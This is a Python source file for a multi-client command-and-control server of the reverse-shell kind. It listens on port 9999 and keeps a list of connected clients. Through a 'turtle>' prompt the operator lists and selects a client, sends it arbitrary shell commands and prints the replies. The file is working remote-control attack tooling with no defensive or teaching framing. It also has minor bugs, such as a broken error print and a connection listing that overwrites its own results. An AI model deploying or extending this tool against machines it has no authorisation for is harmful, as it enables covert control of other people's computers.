import socket
import sys
import threading
import time
from queue import Queue


NUM_OF_THREADS=2
JOB_NUM=[1,2]
queue=Queue()
all_connections=[]
all_address=[]



#Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()

    except socket.error as msg:
        print("Socket creation error: ",+str(msg))


#Binding the socket and listenting for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: "+str(port))
        s.bind((host,port))
        s.listen(5)
        
    except socket.error as msg:
        print("Binding error: ",+str(msg) +"\n"+"Retrying...")
        bind_socket()


#Handling connections from multiple clients
#Closing previous connections when serverMulti.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
    
    del all_connections[:]
    del all_address[:] 

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1) #previous timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :"+address[0])
        except:
            print("Error accepting connections")


#2nd thread functions- 1)see all the client 3)send command to the connected client
#Interactive prompt for sending commands


def start_turtle():
    
    while True:
        cmd=input('turtle> ')
        if cmd=='list':
            list_connections()

        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")



#Display all current active connections with the client
def list_connections():
    results=''
    
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results=str(i)+"   "+str(all_address[i][0])+"   "+str(all_address[i][1])+"\n"
    print("----Clients----"+"\n"+results)


#Selecting the target
def get_target(cmd):
    try:
        target=cmd.replace('select ','') #target = id
        target=int(target)
        conn=all_connections[target]
        print("You are connected to :"+str(all_address[target][0]))
        print(str(all_address[target][0])+">",end="") #192.186.24.182>
        return conn
        
    except:
        print("Selection not vaild")
        return None



#Send command to client
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd=='quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8")
                print(client_response, end="")
        except:
            print("Error sending command")
            break



#Create worker threads
def create_workers():
    for _ in range(NUM_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()



#Do next job that is in queue (handle connections, send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()

        queue.task_done()



#Create jobs
def create_jobs():
    for x in JOB_NUM:
        queue.put(x)

    queue.join()


    

create_workers()
create_jobs()









    


